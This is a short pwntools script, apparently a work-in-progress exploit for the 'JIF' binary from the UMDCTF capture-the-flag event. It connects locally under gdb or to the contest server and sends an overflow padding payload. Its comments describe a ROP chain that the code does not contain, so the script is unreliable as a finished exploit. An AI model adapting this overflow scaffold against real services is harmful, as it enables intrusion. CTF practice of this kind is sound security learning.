#!/usr/bin/python3
from pwn import *

def binary_connect(local, debug):
    if local:
        if debug:
            p = gdb.debug('./JIF', '''
                break main
                break *(main + 734)
                break *(main + +435)
                continue
            ''')
        else:
            p = process('./JIF')

    else:
        # Create process from local 
        p = remote('chals5.umdctf.io',7002)

    return p

def main():
    local = True    
    debug = True

    p = binary_connect(local, debug)

    # recv initial prompt
    print(p.recvuntil(b'> '))

    # send initial rop chain with length 0x1ffe (the 0x1fff char will be overwritten by fgets anyway)
    # store 0x00 in the first qword at name so that it can be used as a nullptr for rsi, rdx
    p.send(b'A' * (0xfa + 0x20) + b'B' * 0x110 + b'\n')
    p.interactive()

if __name__ == "__main__":
    main()